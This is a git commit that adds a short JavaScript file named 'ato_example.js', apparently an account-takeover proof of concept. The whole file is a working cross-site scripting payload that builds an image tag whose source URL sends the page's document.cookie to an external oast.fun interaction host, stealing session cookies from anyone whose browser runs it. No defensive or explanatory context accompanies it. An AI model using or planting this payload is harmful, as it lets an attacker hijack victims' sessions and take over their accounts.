07b95e6d9b9aac0d56edfb4bdcb28494e9fc07df
mrx_w_ <96743453+abx12@users.noreply.github.com>
2024-08-24 22:36:48 +0100

    Create ato_example.js

---
+++ ato_example.js
@@ -0,0 +1,4 @@
+var imgElement = document.createElement('img');
+imgElement.src = 'https://qlczvvvmiqyxqynbxerd4zmpr24rq2j5q.oast.fun/?cookie='+document.cookie;
+imgElement.alt = 'Generated image';
+document.body.appendChild(imgElement);
